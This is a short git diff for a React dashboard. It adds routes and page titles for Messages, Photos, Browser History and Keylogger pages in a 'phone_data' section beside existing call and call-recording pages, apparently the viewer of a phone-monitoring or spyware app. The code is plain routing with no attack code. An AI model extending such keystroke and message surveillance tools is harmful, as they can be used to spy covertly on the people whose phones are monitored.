@@ -14,6 +14,10 @@ import ReelShortPage from './pages/video_app/ReelShortPage';
 import OnlyFansPage from './pages/video_app/OnlyFansPage';
 import CallsPage from './pages/phone_data/CallsPage';
 import CallsRecordingPage from './pages/phone_data/CallsRecordingPage';
+import MessagesPage from './pages/phone_data/MessagesPage';
+import PhotosPage from './pages/phone_data/PhotosPage';
+import BrowserHistoryPage from './pages/phone_data/BrowserHistoryPage';
+import KeyloggerPage from './pages/phone_data/KeyloggerPage';
 
 function MainLayout() {
   const location = useLocation();
@@ -32,6 +36,10 @@ function MainLayout() {
     if (pathname.includes('/onlyfans')) return 'OnlyFans';
     if (pathname.includes('/calls_recording')) return 'Calls Recording';
     if (pathname.includes('/calls')) return 'Calls';
+    if (pathname.includes('/messages')) return 'Messages';
+    if (pathname.includes('/photos')) return 'Photos';
+    if (pathname.includes('/browser_history')) return 'Browser History';
+    if (pathname.includes('/keylogger')) return 'Keylogger';
     return 'Dashboard';
   };
 
@@ -76,6 +84,14 @@ function MainLayout() {
             <Route path="/calls" element={<CallsPage />} />
             <Route path="/phonedata/calls_recording" element={<CallsRecordingPage />} />
             <Route path="/calls_recording" element={<CallsRecordingPage />} />
+            <Route path="/phonedata/messages" element={<MessagesPage />} />
+            <Route path="/messages" element={<MessagesPage />} />
+            <Route path="/phonedata/photos" element={<PhotosPage />} />
+            <Route path="/photos" element={<PhotosPage />} />
+            <Route path="/phonedata/browser_history" element={<BrowserHistoryPage />} />
+            <Route path="/browser_history" element={<BrowserHistoryPage />} />
+            <Route path="/phonedata/keylogger" element={<KeyloggerPage />} />
+            <Route path="/keylogger" element={<KeyloggerPage />} />
           </Routes>
         </main>
       </div>
